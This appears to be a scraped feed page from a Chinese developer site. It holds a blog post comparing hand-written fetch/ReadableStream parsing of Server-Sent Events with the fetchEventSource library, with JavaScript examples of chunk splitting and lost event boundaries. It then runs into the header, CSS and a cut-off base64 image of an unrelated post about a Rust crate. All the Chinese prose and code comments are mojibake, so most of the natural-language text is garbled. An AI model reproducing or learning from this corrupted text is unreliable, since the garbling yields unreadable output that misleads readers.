      if (idMatch) {
        <span class="hljs-attr">recordId.value</span> = parseInt(idMatch)
      }
    }
  }

  // å»é™¤data:
  <span class="hljs-attr">chunk</span> = chunk.replaceAll(<span class="hljs-string">'data:'</span>, <span class="hljs-string">''</span>)
  // å»é™¤RECORD_ID:xxx
  <span class="hljs-attr">chunk</span> = chunk.replace(/RECORD_ID:\d+/g, <span class="hljs-string">''</span>)
  // å»é™¤:end
  <span class="hljs-attr">chunk</span> = chunk.replaceAll(<span class="hljs-string">':end'</span>, <span class="hljs-string">''</span>)
  // å»é™¤æ¢è¡Œ
  <span class="hljs-attr">chunk</span> = chunk.replace(/\n+/g, <span class="hljs-string">''</span>)

  // å¤„ç†STREAM_COMPLETEï¼ˆç»“æŸæ ‡è®°ï¼‰
  if (chunk.includes('STREAM_COMPLETE')) {
    <span class="hljs-attr">chunk</span> = chunk.replaceAll(<span class="hljs-string">'STREAM_COMPLETE'</span>, <span class="hljs-string">''</span>)
    <span class="hljs-attr">isStreaming.value</span> = <span class="hljs-literal">false</span>
    <span class="hljs-attr">done</span> = <span class="hljs-literal">true</span>
  }
  inputValue.value += chunk
}

</code></pre>
<p>è¿™æ®µä»£ç çš„ç‰¹ç‚¹éå¸¸æ˜æ˜¾ï¼š</p>
<ul>
<li>æ‹¿åˆ°çš„æ˜¯<strong>ä¸å®šé•¿Uint8Array</strong></li>
<li>æ¯æ¬¡<code>read()</code>ï¼š
<ul>
<li><strong>å¯èƒ½æ˜¯åŠæ¡æ¶ˆæ¯</strong></li>
<li><strong>ä¹Ÿå¯èƒ½æ˜¯å¤šæ¡æ¶ˆæ¯æ‹¼åœ¨ä¸€èµ·</strong></li>
</ul>
</li>
<li>æ‰€æœ‰åè®®è§£æé€»è¾‘éƒ½åœ¨å‰ç«¯è‡ªå·±å†™</li>
</ul>
<p>ğŸ‘‰ æœ¬è´¨ä¸Šæ˜¯åœ¨ <strong>â€œè‡ªå·±å®ç°ä¸€ä¸ªSSEè§£æå™¨â€</strong> ã€‚</p>
<h3 data-id="heading-3">2ï¸âƒ£ fetchEventSourceï¼šç«™åœ¨ã€Œäº‹ä»¶å±‚ã€å·¥ä½œ</h3>
<p>ç„¶åå†æ¥çœ‹çœ‹ä½¿ç”¨<code>fetchEventSource</code>æ’ä»¶ä¼˜åŒ–è¿‡çš„ä»£ç ï¼Œå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchEventSource</span>(<span class="hljs-string">`<span class="hljs-subst">${baseURL4}</span>/ai/imgToStr`</span>, {
  <span class="hljs-attr">method</span>: <span class="hljs-string">"POST"</span>,
  <span class="hljs-attr">headers</span>: {
    <span class="hljs-title class_">Accept</span>: <span class="hljs-string">"text/event-stream"</span>,
    <span class="hljs-string">"access-token"</span>: <span class="hljs-title function_">getToken</span>()
  },
  <span class="hljs-attr">body</span>: formData,
  <span class="hljs-attr">openWhenHidden</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// é¡µé¢ç¦»å¼€å†å›æ¥ä¹Ÿä¼šç»§ç»­è¯·æ±‚</span>
  <span class="hljs-attr">onmessage</span>: <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> data = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(e.<span class="hljs-property">data</span>)
    <span class="hljs-keyword">if</span> (data.<span class="hljs-property">data</span>.<span class="hljs-property">event</span> === <span class="hljs-string">"recordId"</span>) {
      recordId.<span class="hljs-property">value</span> = data.<span class="hljs-property">data</span>.<span class="hljs-property">content</span>
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (data.<span class="hljs-property">data</span>.<span class="hljs-property">event</span> === <span class="hljs-string">"message"</span>) {
      inputValue.<span class="hljs-property">value</span> += data.<span class="hljs-property">data</span>.<span class="hljs-property">content</span>
    }
  },
  <span class="hljs-attr">onerror</span>: <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
    <span class="hljs-keyword">throw</span> err
  }
})

</code></pre>
<p>å¯ä»¥æ³¨æ„åˆ°å‡ ä¸ªå…³é”®ç‚¹ï¼š</p>
<ul>
<li>æ²¡æœ‰è‡ªå·±å¤„ç†<code>chunk</code></li>
<li>æ²¡æœ‰è‡ªå·±æ‹†åˆ†æ¢è¡Œ</li>
<li>ç›´æ¥æ‹¿åˆ°<code>e.data</code>ï¼Œå°±æ˜¯ä¸€æ¡å®Œæ•´äº‹ä»¶</li>
</ul>
<p>ğŸ‘‰ å› ä¸ºï¼š<code>fetchEventSource</code><strong>å¹¶ä¸æ˜¯â€œè¯»å­—èŠ‚æµâ€</strong> ï¼Œè€Œæ˜¯ï¼š<strong>ä¸¥æ ¼æŒ‰ç…§ SSE åè®®ï¼Œè§£æå®Œä¸€æ•´æ¡äº‹ä»¶åï¼Œæ‰å›è°ƒonmessage</strong></p>
<h2 data-id="heading-4">äºŒã€ä»€ä¹ˆæ˜¯SSEåè®®ï¼Ÿ</h2>
<p><strong>SSEï¼ˆServer-Sent Eventsï¼‰</strong> æ˜¯ä¸€ç§åŸºäº<code>HTTP</code>çš„å•å‘æ¨é€åè®®ï¼Œæµè§ˆå™¨é€šè¿‡ä¸€æ¬¡æ™®é€šçš„<code>HTTP</code>è¯·æ±‚ï¼Œä¸æœåŠ¡ç«¯å»ºç«‹ä¸€æ¡<strong>é•¿è¿æ¥</strong>ï¼Œä¹‹åæœåŠ¡ç«¯å¯ä»¥æŒç»­å‘å®¢æˆ·ç«¯æ¨é€äº‹ä»¶æ•°æ®ã€‚</p>
<p>å®ƒçš„å‡ ä¸ªå…³é”®ç‰¹å¾éå¸¸é‡è¦ï¼š</p>
<ul>
<li>åŸºäº <strong>HTTP/1.1 æˆ– HTTP/2</strong></li>
<li>æœåŠ¡ç«¯ä¸»åŠ¨æ¨é€ï¼Œ<strong>å®¢æˆ·ç«¯åªæ¥æ”¶</strong></li>
<li>æ•°æ®æ ¼å¼æ˜¯<strong>çº¯æ–‡æœ¬</strong></li>
<li>ä½¿ç”¨<code>text/event-stream</code>ä½œä¸º<code>Content-Type</code></li>
</ul>
<p>åœ¨å‰ç«¯ä»£ç ä¸­ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªè¯·æ±‚å¤´ï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">Accept:</span> <span class="hljs-keyword">text</span>/<span class="hljs-keyword">event</span>-stream
</code></pre>
<p>è¿™å¹¶ä¸æ˜¯éšä¾¿å†™çš„ï¼Œè€Œæ˜¯æ˜ç¡®å‘Šè¯‰æœåŠ¡ç«¯ï¼š<strong>æˆ‘æœŸæœ›ä½ ç”¨SSEåè®®æ ¼å¼ï¼ŒæŒç»­å‘æˆ‘æ¨é€äº‹ä»¶ã€‚</strong></p>
<h3 data-id="heading-5">SSEå¹¶ä¸æ˜¯â€œéšä¾¿åå­—ç¬¦ä¸²â€</h3>
<p>æˆ‘ä»¬å¾ˆå¤šäººè¯¯ä»¥ä¸º<code>SSE</code>å°±æ˜¯â€œæœåŠ¡ç«¯ä¸æ–­<code>res.write()</code>å­—ç¬¦ä¸²â€ï¼Œè¿™æ˜¯å¯¼è‡´åç»­å„ç§è§£æé—®é¢˜çš„æ ¹æºã€‚</p>
<p><strong>SSEæ˜¯æœ‰ä¸¥æ ¼æ–‡æœ¬æ ¼å¼è§„èŒƒçš„ã€‚</strong> ä¸€æ¡æœ€åŸºæœ¬çš„<code>SSE</code>äº‹ä»¶é•¿è¿™æ ·ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">data</span>: hello world
</code></pre>
<p>æ³¨æ„ä¸¤ä¸ªéå¸¸å…³é”®çš„ç‚¹ï¼š</p>
<ol>
<li>æ¯ä¸€è¡Œä»¥å­—æ®µåå¼€å¤´ï¼ˆæœ€å¸¸è§çš„æ˜¯<code>data:</code>ï¼‰</li>
<li><strong>ä¸¤ä¸ªæ¢è¡Œç¬¦<code>\n\n</code> æ‰è¡¨ç¤ºä¸€æ¡äº‹ä»¶çš„ç»“æŸ</strong></li>
</ol>
<p>å®Œæ•´ä¸€ç‚¹çš„äº‹ä»¶å¯èƒ½æ˜¯ï¼š</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">id: 123</span>
<span class="hljs-section">event: message</span>
<span class="hljs-section">data: hello</span>
<span class="hljs-section">data: world</span>
</code></pre>
<p>æµè§ˆå™¨åœ¨è§£ææ—¶ï¼Œä¼šæŠŠå¤šè¡Œ<code>data:</code>è‡ªåŠ¨æ‹¼æ¥æˆä¸€æ¡å®Œæ•´æ¶ˆæ¯ï¼š</p>
<pre><code class="hljs">hello
world
</code></pre>
<p>æœ€ç»ˆäº¤ç»™ä¸Šå±‚çš„ï¼Œå°±æ˜¯ä¸€æ¡<strong>å®Œæ•´çš„äº‹ä»¶æ•°æ®</strong>ã€‚</p>
<p>åˆ°è¿™é‡Œï¼Œ<code>SSE</code>åè®®ä¹Ÿä»‹ç»çš„å·®ä¸å¤šäº†ï¼ŒåŒæ—¶æˆ‘ä»¬ä¹Ÿå¤§è‡´é€æäº†ä¸€ç‚¹åœ¨é¡¹ç›®ä¸­ä¸ºå•¥ä¼šé€‰æ‹©ä½¿ç”¨<code>fetchEventSource</code>çš„åŸå› äº†ï¼Œä¸‹é¢å†æ¥çœ‹çœ‹è¿™ä¸¤ç§å®ç°æ–¹æ³•çš„æœ¬è´¨åŒºåˆ«ã€‚</p>
<h2 data-id="heading-6">ä¸‰ã€ä¸¤è€…æœ€æ ¸å¿ƒçš„æœ¬è´¨åŒºåˆ«ï¼ˆä¸æ˜¯APIï¼Œè€Œæ˜¯å±‚çº§ï¼‰</h2>








































<table><thead><tr><th>å¯¹æ¯”ç»´åº¦</th><th>fetchEventSource</th><th>fetch + reader</th></tr></thead><tbody><tr><td>å·¥ä½œå±‚çº§</td><td>äº‹ä»¶å±‚ï¼ˆSSEåè®®ï¼‰</td><td>å­—èŠ‚æµå±‚ï¼ˆTCP chunkï¼‰</td></tr><tr><td>æ˜¯å¦ç†è§£<code>data:</code> / <code>\n\n</code></td><td>âœ… å†…ç½®</td><td>âŒ éœ€è¦æ‰‹å†™</td></tr><tr><td>æ˜¯å¦ä¿è¯ä¸€æ¡æ¶ˆæ¯å®Œæ•´</td><td>âœ… æ˜¯</td><td>âŒ å¦</td></tr><tr><td>æ˜¯å¦è‡ªåŠ¨ç¼“å†²</td><td>âœ… æ˜¯</td><td>âŒ å¦</td></tr><tr><td>æ˜¯å¦å¤„ç†æ‹†åŒ…/ç²˜åŒ…</td><td>âœ… æ˜¯</td><td>âŒ å¦</td></tr><tr><td>ä¸¢æ•°æ®é£é™©</td><td>æä½</td><td>å¾ˆé«˜</td></tr></tbody></table>
<p>ä¸€å¥è¯æ€»ç»“ï¼š</p>
<blockquote>
<p><strong>fetchEventSourceæ¶ˆè´¹çš„æ˜¯â€œè¯­ä¹‰å®Œæ•´çš„äº‹ä»¶â€<br/>
fetch + readeræ¶ˆè´¹çš„æ˜¯â€œè¿˜æ²¡æˆå½¢çš„å­—èŠ‚ç¢ç‰‡â€</strong></p>
</blockquote>
<h2 data-id="heading-7">ä¸‰ã€é‡ç‚¹ï¼šä¸ºä»€ä¹ˆfetchæ–¹å¼æ›´å®¹æ˜“â€œä¸¢æ•°æ®â€ï¼Ÿ</h2>
<p>é€šè¿‡ä¸Šé¢çš„å¯¹æ¯”ï¼Œæˆ‘ä»¬æ¸…æ¥šäº†ä¸¤è€…æœ€æœ¬è´¨çš„åŒºåˆ«ï¼Œä½†æ˜¯è¿˜æ˜¯è¦å›åˆ°ä»£ç æœ¬èº«ï¼Œæ¥çœ‹çœ‹åˆ°åº•æ˜¯ä»€ä¹ˆåŸå› å¯¼è‡´<code>fetch</code>æ–¹å¼â€œä¸¢æ•°æ®â€â†’</p>
<h3 data-id="heading-8">1ï¸âƒ£ é¦–å…ˆæ˜ç¡®ä¸€ç‚¹ï¼šTCPä¸ä¼šä¸¢åŒ…ï¼Œä½†ä½ ä¼šâ€œè¯»ä¸¢â€</h3>
<p>å¾ˆå¤šäººè¯´â€œ<code>fetch</code>ä¼šä¸¢åŒ…â€ï¼Œè¿™æ˜¯<strong>ä¸ä¸¥è°¨ä½†å·¥ç¨‹ä¸Šæˆç«‹</strong>çš„è¯´æ³•ã€‚</p>
<p>å‡†ç¡®è®²æ˜¯ï¼š<strong>TCPå±‚ä¸ä¸¢ï¼Œä½†å‰ç«¯çš„â€œè§£ææ–¹å¼â€å¯¼è‡´äº†è¯­ä¹‰ä¸¢å¤±</strong></p>
<h3 data-id="heading-9">2ï¸âƒ£ ä¸¢æ•°æ®çš„ç¬¬ä¸€ä¸ªåŸå› ï¼šSSEæ¶ˆæ¯è¢«æ‹†æˆå¤šä¸ªchunk</h3>
<p>åœ¨ä¸Šé¢ä»‹ç»<code>SSE</code>åè®®ä¸­ï¼Œæˆ‘ä»¬æ¸…æ¥šçŸ¥é“ä¸€æ¡æœ€åŸºæœ¬çš„<code>SSE</code>äº‹ä»¶æ˜¯å•¥æ ·çš„ï¼Œè¿™é‡Œå¸¦å…¥ä¸€ä¸‹çœŸå®è¯·æ±‚å†ä»‹ç»ä¸€ä¸‹ä¸€æ¡<code>SSE</code>äº‹ä»¶çš„å®Œæ•´è¿‡ç¨‹ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">data</span>:xxx
<span class="hljs-keyword">data</span>:yyy
</code></pre>
<p>ä½†åœ¨ç½‘ç»œå±‚ï¼Œå®ƒ<strong>å¯èƒ½ä¼šè¢«æ‹†æˆè¿™æ ·åˆ°è¾¾å‰ç«¯</strong>ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">ç¬¬<span class="hljs-number">1</span>æ¬¡ <span class="hljs-built_in">read</span>(): <span class="hljs-string">"data:xxx\ndata:"</span>
ç¬¬<span class="hljs-number">2</span>æ¬¡ <span class="hljs-built_in">read</span>(): <span class="hljs-string">"yyy\n\n"</span>
</code></pre>
<p>è€Œåœ¨ä»£ç é‡Œï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">chunk</span> = decoder.decode(value)
<span class="hljs-attr">chunk</span> = chunk.replaceAll(<span class="hljs-string">'data:'</span>, <span class="hljs-string">''</span>)
<span class="hljs-attr">chunk</span> = chunk.replace(/\n+/g, <span class="hljs-string">''</span>)
inputValue.value += chunk
</code></pre>
<p>é—®é¢˜æ¥äº†ï¼š</p>
<ul>
<li>å‡è®¾<code>chunk</code>ä¸€å®šæ˜¯â€œå®Œæ•´è¯­ä¹‰â€</li>
<li>å®é™…ä¸Š<code>chunk</code>åªæ˜¯ <strong>ä»»æ„åˆ‡å‰²çš„å­—èŠ‚ç‰‡æ®µ</strong></li>
<li><code>replace + æ‹¼æ¥</code>æ˜¯<strong>ç ´åæ€§æ“ä½œ</strong></li>
</ul>
<p>ğŸ‘‰ ä¸€æ—¦æ‹†åœ¨<code>data:</code>ã€<code>RECORD_ID:</code>ã€<code>:end</code>ä¸­é—´ï¼Œ<br/>
<strong>è¿™ä¸€æ®µè¯­ä¹‰å°±å†ä¹Ÿè¿˜åŸä¸å›æ¥äº†</strong></p>
<p>è¿™å°±æ˜¯<strong>çœ‹èµ·æ¥æ²¡æŠ¥é”™ï¼Œä½†å†…å®¹å°‘å­—ã€ä¹±å­—</strong>çš„æ ¹æºã€‚</p>
<h3 data-id="heading-10">3ï¸âƒ£ ç¬¬äºŒä¸ªåŸå› ï¼šchunkä¸­å¯èƒ½åŒ…å«ã€Œå¤šæ¡æ¶ˆæ¯ã€</h3>
<p>åè¿‡æ¥ï¼ŒæœåŠ¡ç«¯ä¸€æ¬¡<code>flush</code>ï¼Œä¹Ÿå¯èƒ½è¢«æµè§ˆå™¨åˆå¹¶æˆä¸€ä¸ª<code>chunk</code>ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">data</span>:hello\n\n
<span class="hljs-keyword">data</span>:world\n\n
</code></pre>
<p>ä¸€æ¬¡<code>read()</code>æ‹¿åˆ°ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">data</span>:hello\n\ndata:world\n\n
</code></pre>
<p>è€Œåœ¨ä»£ç é‡Œï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">chunk.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">'data:'</span>, <span class="hljs-string">''</span>)
chunk.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\n+/g</span>, <span class="hljs-string">''</span>)
</code></pre>
<p>ä¼šç›´æ¥å˜æˆï¼š</p>
<pre><code class="hljs">helloworld
</code></pre>
<p>åˆ°è¿™é‡Œå¯ä»¥å‘ç°å·²ç»<strong>ä¸¢æ‰äº†â€œäº‹ä»¶è¾¹ç•Œâ€è¿™ä¸ªæœ€é‡è¦çš„ä¿¡æ¯</strong>ã€‚</p>
<h3 data-id="heading-11">4ï¸âƒ£ ç¬¬ä¸‰ä¸ªåŸå› ï¼šTextDecoderä½¿ç”¨æ–¹å¼æœ¬èº«å°±æœ‰å‘</h3>
<pre><code class="hljs language-php" lang="php">decoder.<span class="hljs-title function_ invoke__">decode</span>(value, { <span class="hljs-attr">stream</span>: <span class="hljs-literal">false</span> })
</code></pre>
<ul>
<li><code>stream: false</code> è¡¨ç¤º<strong>æ¯æ¬¡éƒ½æ˜¯ä¸€ä¸ªâ€œç‹¬ç«‹å­—ç¬¦ä¸²â€</strong></li>
<li>å¦‚æœ<code>UTF-8</code>å­—ç¬¦è¢«æ‹†æˆ2æ¬¡<code>Uint8Array</code></li>
<li><strong>å¤šå­—èŠ‚å­—ç¬¦ä¼šç›´æ¥æŸå</strong></li>
</ul>
<p>æ­£ç¡®æ–¹å¼å…¶å®æ˜¯ï¼š</p>
<pre><code class="hljs language-php" lang="php">decoder.<span class="hljs-title function_ invoke__">decode</span>(value, { <span class="hljs-attr">stream</span>: <span class="hljs-literal">true</span> })
</code></pre>
<p>ä½†å³ä¾¿å¦‚æ­¤ï¼Œ<strong>è¯­ä¹‰è¾¹ç•Œé—®é¢˜ä¾ç„¶å­˜åœ¨</strong>ã€‚</p>
<h2 data-id="heading-12">å››ã€ä¸ºä»€ä¹ˆfetchEventSourceå‡ ä¹ä¸ä¼šå‡ºç°è¿™äº›é—®é¢˜ï¼Ÿ</h2>
<p>å› ä¸ºå®ƒ<strong>å·²ç»å¸®ä½ åšå®Œäº†è¿™äº›è„æ´»</strong></p>
<h3 data-id="heading-13">fetchEventSourceå†…éƒ¨åšäº†ä»€ä¹ˆï¼Ÿ</h3>
<ol>
<li>æŒç»­è¯»å–<code>response stream</code></li>
<li>å†…éƒ¨ç»´æŠ¤ä¸€ä¸ª<code>buffer</code></li>
<li>æŒ‰<code>SSE</code>è§„èŒƒè§£æï¼š
<ul>
<li><code>data:</code></li>
<li><code>id:</code></li>
<li><code>event:</code></li>
<li><code>\n\n</code>ä½œä¸ºäº‹ä»¶ç»“æŸæ ‡å¿—</li>
</ul>
</li>
<li><strong>åªæœ‰åœ¨ä¸€æ•´æ¡äº‹ä»¶å®Œæ•´å</strong>
<ul>
<li>æ‰è§¦å‘<code>onmessage</code></li>
<li>å¹¶ä¸”ä¿è¯<code>e.data</code>æ˜¯å®Œæ•´å­—ç¬¦ä¸²</li>
</ul>
</li>
</ol>
<p>ğŸ‘‰ æ‰€ä»¥æ‹¿åˆ°çš„æ°¸è¿œæ˜¯ï¼š</p>
<pre><code class="hljs language-css" lang="css">{
  data: <span class="hljs-string">"{...å®Œæ•´JSON...}"</span>
}
</code></pre>
<p>è€Œä¸æ˜¯ç¢ç‰‡ã€‚</p>
<h2 data-id="heading-14">äº”ã€ç»“è®ºï¼ˆéå¸¸é‡è¦ï¼‰</h2>
<h3 data-id="heading-15">âœ… ä»€ä¹ˆåœºæ™¯å¿…é¡»ç”¨ fetchEventSourceï¼Ÿ</h3>
<ul>
<li><code>SSE / text-event-stream</code></li>
<li><code>AI</code>æµå¼è¾“å‡º</li>
<li><code>OCR</code>/<code>LLM</code>/é•¿æ–‡æœ¬é€æ­¥è¿”å›</li>
<li>éœ€è¦<strong>ä¸¥æ ¼ä¿è¯å†…å®¹ä¸ä¸¢ã€ä¸ä¹±ã€ä¸å°‘</strong></li>
</ul>
<p>ğŸ‘‰ <strong>é¦–é€‰ fetchEventSource</strong></p>
<h3 data-id="heading-16">âš ï¸ ä»€ä¹ˆæ—¶å€™æ‰è¯¥ç”¨fetch + readerï¼Ÿ</h3>
<ul>
<li>æ˜ç¡®çŸ¥é“è¿™æ˜¯ï¼š
<ul>
<li>äºŒè¿›åˆ¶æµ</li>
<li>æ–‡ä»¶æµ</li>
<li>è‡ªå®šä¹‰åè®®</li>
</ul>
</li>
<li>æˆ–è€…ï¼š
<ul>
<li>è‡ªå·±å®ç°å®Œæ•´buffer</li>
<li>è‡ªå·±æŒ‰<code>\n\n</code> æ‹†äº‹ä»¶</li>
<li>æ˜ç¡®å¤„ç†æ‹†åŒ…ã€ç²˜åŒ…ã€UTF-8è¾¹ç•Œ
å¦åˆ™ï¼š</li>
</ul>
</li>
</ul>
<blockquote>
<p><strong>fetch + reader â‰  SSEå®¢æˆ·ç«¯<br/>
åªæ˜¯ä¸€ä¸ªâ€œå­—èŠ‚è¯»å–å·¥å…·â€</strong></p>
</blockquote>
<p>æœ€åï¼Œä¸€å¥è¯æ€»ç»“ï¼š<strong>fetchEventSourceæ˜¯â€œåè®®çº§æ¶ˆè´¹â€ï¼Œå¤©ç„¶é˜²ä¸¢åŒ…ï¼›è€Œfetchæµè¯»å–æ˜¯â€œå­—èŠ‚çº§æ¶ˆè´¹â€ï¼Œææ˜“åœ¨è§£æé˜¶æ®µä¸¢è¯­ä¹‰</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[rust crate undoc ä»‹ç»]]></title>    <link>https://juejin.cn/post/7592501225004056627</link>    <guid>https://juejin.cn/post/7592501225004056627</guid>    <pubDate>2026-01-07T15:47:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592501225004056627" data-draft-id="7592455394062811174" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="rust crate undoc ä»‹ç»"/> <meta itemprop="keywords" content="Rust"/> <meta itemprop="datePublished" content="2026-01-07T15:47:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Andrew_Ryan"/> <meta itemprop="url" content="https://juejin.cn/user/3993068510655703"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            rust crate undoc ä»‹ç»
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3993068510655703/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Andrew_Ryan
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T15:47:00.000Z" title="Wed Jan 07 2026 15:47:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.7;font-weight:400;font-size:16px;overflow-x:hidden;color:#212122}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-bottom:8px;padding-bottom:8px}.markdown-body h1{color:#a0a0a0;font-size:38px;margin-top:32px;padding-top:32px}.markdown-body h2{color:#fff;background-color:#212122;width:fit-content;border-bottom-right-radius:100px;margin-top:47px;margin-bottom:16px;padding:4px 48px 4px 8px;line-height:1.7;font-size:30px;transition:all .3s ease-out}.markdown-body h2:hover{border-bottom-right-radius:50px;transition:all .3s ease-out}.markdown-body h3{font-size:24px;padding-left:8px;margin-top:32px;border-bottom:2px solid #c6c4c4;line-height:1.7}.markdown-body h4{font-size:20px;padding-left:8px;margin-top:32px;border-bottom:1px solid #ddd}.markdown-body h5{font-size:16px;margin-top:24px}.markdown-body h6{margin-top:16px;line-height:1.1}.markdown-body p{font-size:16px;text-align:start;white-space:normal;text-size-adjust:auto;line-height:2;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%;margin:auto;padding-left:8px;padding-right:8px}.markdown-body hr{border:none;border-top:4px double #212122;margin-top:32px;margin-bottom:32px;text-align:center}.markdown-body hr:after{content:"â™¥";display:inline-block;position:relative;top:-15px;padding:0 10px;color:#212122;font-size:18px}.markdown-body code{word-break:break-word;overflow-x:auto;background-color:#f1f1f1;color:#ef7060;font-size:14px;padding:.065em 6px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;border-radius:2px}.markdown-body pre{overflow:auto;position:relative;line-height:1.7;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);margin:32px 16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAAAdCAYAAABcz8ldAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAhgSURBVGhD7Zp7bBTHHcdn33t7vvOdzy+ITVKDU0xIKG2ABCPTRCCaUiEVKWoqRJuASAhCitRCVKSoalFUKZBiSmmFRRJKRUnUtIpo+aNqGgwoOCmuFUIRzxjwE4zte+97drYzztji8HPvtkit/PnH+n1397Tz+83vN/PbMZhmmmmm+d+BoX8n5diihcGqgFQf5vk6BMAskWUlw3GyFnIvtqWSf91w7mKC3npfOLX7wYeiIa6BBWCOLLFRF2NB0JvIOP/80YG+k2ev6S699b/OzOfKBW5l5KsgyC4DCFQDnpEAdE1goc/dlNPc/Up7P711UiYNSMuyxeUzZPnHgGHWh5XADEkSAcdiN+AnEXIBhBComgFU0/xQR+jnj51sOUMf9Z0NKyL8S9+JPBEN8zuCMrsqGOA5QWAAyzLAxe53HBeYFgJp1c5Cx33nyIfpV3e+22/Sx32nev/sMCgVnmM4bjOniAtZWQAsz315EfsGQQc4hgWcjHkCmOj1rheuNn95cXwmDMiVp5etC/D8m5FwUWVQUYYGPh6mZYFUOgsGVa1pXvOZzVT2jRuH54RM230jEuI3RcIiL4l4UkxAJmuD/riVsqD7ct2m9nep7BtVTbVfZ0uE/UIk+CQflAHDjf8+Lg6MldYATGpH3c/Ul7p3dWXppVGM6eElJSHmnQWPbSlRlN1lJcUBjqNRnwJZVQO3B5P/uq5rK1d90pakckFcaKp5UJHY92JR8YlwkUDVySEZfGfQdO7E7Z8s2HL9TSoXTPXRud9nA8IBqSwcZgWeqpPj6BYw7yTbXBN9q2v9lQEq5zBmWA8vWLCptCi4tzwW8RQMQlFQATPLSh6vCSh/plJBkMyQBHZfWYnkKRgEktEVpTJXERN2Xzo4ex2VC6K6qXYpF5b3ypVRT8EgcAERSJXRbwCBOTFzXblM5RxGBaRt+ZPYA+LO0mgxz5K1Ig+UgAzKIuGnz39z6S+olDeaibaXRsU1RUFvgx+GwTWgPCaDgMw2XXpr9gwq50XV0bkxJiYeEiNF5cwE5XsiOEkAUkXkUW51SSOVchjl8WKef604XFSRbzCGCYeCoESS